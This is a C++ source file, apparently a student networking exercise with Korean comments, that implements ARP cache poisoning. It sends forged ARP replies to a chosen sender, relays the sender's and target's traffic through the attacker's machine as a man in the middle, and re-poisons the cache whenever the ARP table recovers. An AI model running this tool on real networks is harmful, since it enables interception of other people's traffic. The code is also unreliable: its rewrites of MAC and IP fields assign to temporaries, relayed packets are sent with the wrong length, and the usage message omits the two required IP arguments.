#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <cstdlib>
#include <string>
#include <libnet.h>


#include "AttackerInfo.h"
#include "SenderUtil.h"
#include "TargetUtil.h"


#define MAC_ADDR_LEN 6



//Attacker MAC function

void usage() {
        printf("syntax: send-arp-test <interface>\n");
        printf("sample: send-arp-test wlan0\n");
}


int main(int argc, char* argv[]) {
        if (argc <=3) { //입력값이 3개 이하면 에러
                usage();
                return -1;
        }  

        char* dev = argv[1]; //네트워크 인터페이스 명
	
	uint8_t mac_addr[6];
    	GetMacAddress(dev, mac_addr);
	//Mac macAddress = mac_addr;
        Mac macAddress = getMacAddress(dev);
	//Mac macAddress = Mac("00:0c:29:50:5e:11");
	
	
        //pcap세션 오픈
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }
        
        
        
        Ip sip(argv[2]);
        Ip tip(argv[3]);

        Ip AttackerIp = getAttackerIp(dev);
        Mac SenderMac = getSenderMac(handle, macAddress, AttackerIp ,Ip(argv[2]));
	
        Mac TargetMac = getTargetMac(handle, macAddress, AttackerIp ,Ip(argv[3]));
        
        //Sender감염 패킷생성
        EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(argv[2]),Ip(argv[3]));
        //패킷 전송
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
	printf("Send First Packet\n");



        

        
        //릴레이 패킷 전송
        //패킷 캡쳐
        while(1){

		const u_char* received_pkt;
		struct pcap_pkthdr* header;
		// struct EthHdr* ARPpkt_eth;
		// struct ArpHdr* ARPpkt_ip;
		struct libnet_ethernet_hdr* Packet_eth;
		struct libnet_ipv4_hdr* Packet_ip;


                res = pcap_next_ex(handle, &header, &received_pkt);
                if (res == 0) {
			printf("No Cap\n");
			continue;
		}
                if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                        break;
                }

		

                // ARPpkt_eth = (struct EthHdr *)received_pkt;
                // ARPpkt_ip = (struct ArpHdr *)(received_pkt + sizeof(struct EthHdr));

                Packet_eth = (struct libnet_ethernet_hdr *)(received_pkt);
                Packet_ip = (struct libnet_ipv4_hdr *)(received_pkt + sizeof(struct libnet_ethernet_hdr));

                //Sender -> Attacker -> Target
                if(ntohs(Packet_eth-> ether_type)==(EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==SenderMac){
                        Mac(Packet_eth -> ether_dhost) = TargetMac;
                        Mac(Packet_eth -> ether_shost) = macAddress;
			ntohs(Packet_ip->ip_src) = AttackerIp;
                        ntohs(Packet_ip->ip_dst) = Ip(argv[3]);
                        res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        else{
                                printf("Sender -> Attacker -> Target\n");
                        }    
                }
                //Target -> Attaceker -> Sender
                else if(ntohs(Packet_eth -> ether_type) == (EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==TargetMac){
                        Mac(Packet_eth -> ether_dhost) = SenderMac;
                        Mac(Packet_eth -> ether_shost) = macAddress;
                        res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }else{
                                printf("Target-> Attacker -> Sender\n");
                        }
                        
                }

                //When ARP Table Recover
                else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
                        if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                //Sender감염 패킷생성
                                EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(argv[2]),Ip(argv[3]));
                                //패킷 전송
                                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                                if (res != 0) {
                                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                                }else{
                                        printf("Detecting Arp Recover and re-Infection\n");
                                }

                        }
                }
                else{
                        EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(argv[2]),Ip(argv[3]));
                        sleep(1);
                        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        else{
                                printf(" packet transmission\n");
                        }
                }
        }
        
 	pcap_close(handle);
}
       

